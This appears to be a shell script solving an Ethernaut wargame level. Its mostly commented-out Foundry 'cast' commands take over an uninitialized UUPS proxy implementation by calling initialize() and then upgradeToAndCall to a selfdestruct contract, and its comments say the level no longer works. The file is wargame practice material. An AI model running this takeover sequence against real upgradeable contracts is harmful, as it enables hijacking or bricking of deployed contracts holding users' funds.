source ~/ethernauts/.env
echo "RPC_URL: $RPC_URL"

# cast storage \
#     --rpc-url $RPC_URL \
#     0x112e20f5b67E8DD78B3Ac52F0bB337Fee1f0fae9 \
#     0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc

# addr of impl: 0xc9386028c77531d20c67ddfbac632ec34143b522

# cast send \
#     --rpc-url $RPC_URL \
#     --private-key $PRIVATE_KEY \
#     0xc9386028c77531d20c67ddfbac632ec34143b522 \
#     "initialize()()"

# addr of selfDestruct contract: 0xBdbF8F01132515e67dc1Bd9E9B641D81F3494C2B

# cast send \
#     --rpc-url $RPC_URL \
#     --private-key $PRIVATE_KEY \
#     0xc9386028c77531d20c67ddfbac632ec34143b522 \
#     "upgradeToAndCall(address, bytes)()" 0xBdbF8F01132515e67dc1Bd9E9B641D81F3494C2B 0x00

# cast storage \
#     --rpc-url $RPC_URL \
#     0xc9386028c77531d20c67ddfbac632ec34143b522 \
#     0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
# was upgraded, but not destroyed since selfDestruct doesn't destroy anymore.

# selfDestruct now doesn't really destroy the contracts code, so this level is not solvable
# but this was the solution
